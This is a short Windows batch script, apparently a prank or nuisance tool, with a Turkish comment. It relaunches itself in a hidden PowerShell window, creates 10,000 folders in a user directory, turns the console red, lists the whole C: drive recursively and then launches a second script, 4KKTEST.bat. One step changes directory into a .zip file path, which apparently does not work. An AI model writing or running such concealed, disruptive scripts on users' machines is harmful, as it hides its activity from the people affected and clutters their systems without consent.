@echo off
if "%1" neq "hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c ""%~f0"" hidden' -WindowStyle Hidden"
    exit /b
)

rem Kendi BAT kodların buradan devam eder
cd C:\Users\{COMPUTER_USERNAME}\INDEX-main.zip
for /l %%i in (1,1,10000) do md %%i
cd C:\
color 4
tree
dir/s
cd C:\Users\{COMPUTER_USERNAME}\INDEX-main
start 4KKTEST.bat
